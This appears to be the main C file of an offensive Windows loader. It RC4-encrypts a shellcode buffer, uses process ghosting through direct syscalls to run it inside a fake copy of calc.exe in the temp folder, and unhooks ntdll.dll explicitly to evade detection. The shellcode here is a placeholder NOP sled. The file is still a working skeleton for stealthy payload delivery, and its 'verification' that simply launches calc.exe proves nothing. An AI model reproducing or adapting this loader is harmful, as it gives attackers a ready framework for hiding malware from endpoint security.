#include <windows.h>
#include <shlobj.h>
#include <stdio.h>
#include "ProcessCreation.h"
#include "PayloadInjection.h"
#include "RC4Encryption.h"
#include "Syscalls.h"
#include "Hollowing.h"
#include "Ghosting.h"

// Define a simple verification function
bool CheckPayloadExecution() {
    // This could be a reverse shell success check or a connection attempt
    // For simplicity, let's log success based on a simple operation, like launching calc.exe
    if (system("calc.exe") == 0) {
        printf("[+] Payload (calc.exe) successfully executed.\n");
        return true;
    }
    return false;
}

int main() {
    HANDLE hProcess = NULL, hThread = NULL;
    SyscallStruct St;

    // Initialize syscalls
    if (!InitializeSyscallStruct(&St)) {
        printf("[!] Could Not Initialize Syscalls\n");
        return -1;
    }

    // Step 1: Define the payload and RC4 encryption key
    printf("[*] Defining payload and encryption key...\n");
    unsigned char payload[] = {
        0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0xCC // Example shellcode (NOP sled with INT3 for debugging)
    };
    unsigned char key[] = { 0x11, 0x22, 0x33, 0x44 };  // Example key

    // Step 2: Encrypt the payload using RC4
    printf("[*] Encrypting payload with RC4...\n");
    RC4Encrypt(payload, sizeof(payload), key, sizeof(key));
    printf("[+] Payload encrypted successfully.\n");

    // Dynamically retrieve temp path for the fake executable
    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    strcat(tempPath, "fake_calc.exe");  // Creating fake executable path in temp folder

    printf("Fake executable will be created at: %s\n", tempPath);

    // Step 3: Perform Process Ghosting (ghost calc.exe)
    printf("[*] Ghosting process (calc.exe)...\n");
    if (!ProcessGhosting("C:\\Windows\\System32\\calc.exe", tempPath, &St, &hProcess, &hThread)) {
        printf("[!] Process ghosting failed.\n");
        return -1;
    }

    printf("[+] Process ghosted successfully.\n");

    // Check if the process and thread handles are valid before proceeding
    if (hProcess == NULL || hThread == NULL) {
        printf("[!] Invalid process or thread handle.\n");
        return -1;
    }

    // Optional: Unhook ntdll.dll to evade detection (if required)
    printf("[*] Unhooking ntdll.dll...\n");
    if (!UnhookDLL(hProcess, &St)) {
        printf("[!] Failed to unhook ntdll.dll.\n");
        return -1;
    }

    // Step 4: Resume the thread to execute the payload
    printf("[*] Resuming the thread to execute the payload...\n");
    ResumeThread(hThread);
    printf("[+] Thread resumed, payload should now execute.\n");

    // Step 5: Check if the payload was successfully executed
    if (!CheckPayloadExecution()) {
        printf("[!] Payload execution failed.\n");
        return -1;
    }

    // Close handles after use
    CloseHandle(hProcess);
    CloseHandle(hThread);

    return 0;
}
